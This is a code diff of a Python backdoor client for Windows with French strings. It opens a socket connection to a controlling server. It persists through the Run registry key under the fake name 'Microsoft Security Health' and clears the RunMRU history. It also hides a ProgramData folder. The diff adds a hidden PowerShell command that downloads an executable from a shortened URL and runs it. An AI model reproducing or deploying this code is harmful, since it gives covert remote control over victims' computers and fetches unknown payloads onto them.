@@ -1,13 +1,23 @@
 import socket, os, subprocess, time, sys
 
-hote = "172.20.31.16"
+hote = "localhost"
 port = 12800
 
+def auto_create_folder(folder_path):
+    try:
+        path = ""
+        for i in folder_path.split("\\"):
+            path += i + "\\"
+            if os.path.isdir(path) is False:
+                os.mkdir(path)
+    except:
+        return 1
+    
 def connxion(hote,port):
     connect_to_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         connect_to_server.connect((hote, port))
-    except ConnectionRefusedError:
+    except:
         return 1
     
     print("Connexion établie avec le serveur sur le port {}".format(port))
@@ -112,19 +122,34 @@ def connxion(hote,port):
 
 def auto_setup_whetever_you_are():
     path_file = os.getcwd()+"\\"+sys.argv[0]
+    file_name = sys.argv[0]
     if "\\" in sys.argv[0]:
         path_file = sys.argv[0]
-
-    commande = []
-    commande.append('reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Security Health" /t REG_SZ /d "' + path_file + '"')
-    commande.append('reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f')
-    while commande:
-        subprocess.Popen(commande.pop(0), shell=True)
+        file_name = path_file.split("\\")[-1]
     
+    default_folder = "C:\\ProgramData\\Windows\\Microsoft\\Security Health\\"
+    auto_create_folder(default_folder)
+    os.system("attrib +h C:\\ProgramData\\Windows")
+
+    # if os.path.isdir(default_folder) is True:
+    #     default_folder = default_folder+"Microsoft Security Health.exe"
+    # else:
+    # default_folder = path_file
+    default_folder = "C:\\salut.exe"
+
+    la_commande = 'cmd /c start /min \\"\\" \\"powershell.exe\\" -windowstyle hidden Invoke-WebRequest -Uri  shorturl.at/awNTU -OutFile ' + "'"+default_folder+"'; $exe = '"+default_folder+"'; ^& $exe -host a -retry 5"
+    print(la_commande)
+    # commande = []
+    # commande.append('reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v "Microsoft Security Health" /t REG_SZ /d "' + la_commande + '">nul')
+    # commande.append('reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f>nul')
+    # while commande:
+    #     subprocess.Popen(commande.pop(0), shell=True)
+
+
 
 auto_setup_whetever_you_are()
 
-while True:
-    connxion(hote,port)
-    print("reco dans 5 secondes")
-    time.sleep(5)
+# while True:
+#     connxion(hote,port)
+#     print("reco dans 5 secondes")
+#     time.sleep(5)
